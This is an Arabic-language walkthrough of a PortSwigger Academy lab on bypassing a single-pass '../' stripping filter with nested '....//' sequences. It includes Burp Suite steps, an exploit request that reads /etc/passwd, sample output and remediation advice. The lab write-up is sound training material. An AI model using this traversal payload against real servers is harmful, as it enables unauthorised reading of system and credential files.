# Lab 03 — Traversal Sequences Stripped Non-Recursively (تجاوز الفلتر الأحادي بالتداخل)

[![التصنيف](https://img.shields.io/badge/الفئة-Path%20Traversal-purple)]()
[![النوع](https://img.shields.io/badge/النوع-Path%20Traversal%20—%20Non-Recursive%20Sanitization%20Bypass-orange)]()
[![مستوى الخطورة](https://img.shields.io/badge/الخطورة-عالي%20(High)-critical)]()
[![المصدر](https://img.shields.io/badge/المصدر-PortSwigger%20Academy-blue)](https://portswigger.net/web-security/file-path-traversal)

> هذا الشرح جزء من سلسلة [معامل اجتياز المسارات (Path Traversal)](./README.md) — أكاديمية PortSwigger.

---

## 1. بطاقة تعريف اللاب (Overview)

| الحقل | التفاصيل |
|---|---|
| **اسم اللاب** | Lab 03 — Traversal Sequences Stripped Non-Recursively (تجاوز الفلتر الأحادي بالتداخل) |
| **تصنيف الثغرة** | Path Traversal — Non-Recursive Sanitization Bypass |
| **معيار الضعف (CWE)** | CWE-22: Improper Limitation of a Pathname to a Restricted Directory |
| **مستوى الخطورة** | عالي (High) |
| **الهدف من اللاب** | تجاوز فلتر استبدال النصوص لمرة واحدة باستخدام تتابع متداخل يلتئم بعد الحذف. |

---

## 2. فكرة اللاب وسيناريو المشكلة (Concept & Vulnerability Mechanism)

استخدم المطور هنا دالة استبدال نصوص برمجية شهيرة، مثل: `filename = filename.replace("../", "")`. الفكرة التي اعتقدها المطور هي أنه إذا حاول المهاجم كتابة `../`، سيقوم الكود بحذفها فوراً وتجريد النص منها.

**الخلل الفكري هنا:** هذه الدالة تنفذ عملية استبدال لمرة واحدة فقط (Non-recursive single pass)، ولا تعيد فحص النص الناتج بعد الحذف! إذا أرسل المهاجم النمط المتداخل: `....//`:
1. يبحث الكود عن أول ظهور لـ `../` فيجدها في المنتصف (بين النقطتين الأوليين والسلاش الأخير).
2. يحذف الكود تلك الـ `../`.
3. تلتحم النقطتان المتبقيتان مع السلاش الأخير لتكونا: `../` من جديد! وتصل الدالة لنظام الملفات لتنفذ الثغرة.

---

## 3. التحليل الجذري للسبب (Root Cause Analysis)

### 🔴 وجهة نظر المهاجم (Attacker Perspective):
المهاجم يزرع نمط `../` داخل نمط آخر بحيث يؤدي حذفه إلى تفعيل النمط الخارجي المتبقي.

### 🟢 وجهة نظر المدافع والمطور (Defender Perspective):
المطور استخدم استبدال النصوص الأحادي لمنع التهديدات الأمنية بدلاً من رفض المدخل بالكامل أو التحقق المعماري.

---

## 4. خطوات الاستغلال والحل بالتفصيل (Proof of Concept - PoC)

1. التقط طلب الصورة في Burp Suite: `GET /image?filename=53.jpg`.
2. أرسل الطلب إلى **Burp Repeater**.
3. جرب إرسال البيلود العادي `../../../etc/passwd` ولاحظ أنه يفشل لأن السيرفر يحذف السلاسل.
4. الآن، استخدم البيلود المتداخل التالي:
`filename=....//....//....//etc/passwd`.
5. اضغط Send: ستجد أن السيرفر حذف السلاسل الداخلية، فالتحمت السلاسل الخارجية وقرأ ملف `/etc/passwd` بنجاح!

---

## 5. أدلة الترافيك (Evidence: Request / Response)

### نموذج طلب الاستغلال (Exploit Request):
```http
GET /image?filename=....//....//....//etc/passwd HTTP/1.1
Host: <lab-id>.web-security-academy.net
```

### نموذج استجابة السيرفر (Server Response):
```http
HTTP/1.1 200 OK

root:x:0:0:root:/root:/bin/bash
...
```

---

## 6. الأثر الواقعي للثغرة (Impact)

تجاوز فلاتر الحماية المعتمدة على استبدال الكلمات وقراءة ملفات النظام.

---

## 7. الحماية والإغلاق البرمجي (Remediation)

لا تستخدم أبداً دوال استبدال النصوص (Sanitization) لتنظيف مدخلات الملفات. إذا احتوى المدخل على أحرف غير مسموحة، يجب رفض الطلب بالكامل وليس محاولة تنظيفه.

---

## 8. المراجع الرسمية (References)

- [PortSwigger Web Security Academy — Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [OWASP Top 10 — A01:2021 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)

---
*تم إعداد هذا التوثيق للأغراض التعليمية واختبار الاختراق الأخلاقي المصرح به.*
